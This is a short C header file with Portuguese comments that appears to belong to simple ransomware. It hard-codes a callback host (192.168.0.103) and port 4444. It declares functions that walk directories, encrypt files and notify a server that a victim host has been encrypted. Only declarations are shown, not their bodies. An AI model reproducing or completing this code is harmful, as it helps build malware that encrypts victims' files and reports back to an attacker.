#ifndef USAGE_H_INCLUDED
#define USAGE_H_INCLUDED

#define myhost "192.168.0.103"
#define myport 4444

struct dirent *getdir;

//Funçao que avisa o servidor que algum host foi criptografado
void connectserver();
//Funçao que faz a criptografia de arquivos
void encryptfile(char *encryptfile);
//Funçao que procura arquivos & diretorios
void WhatIsDir(char *name_dir);

#endif
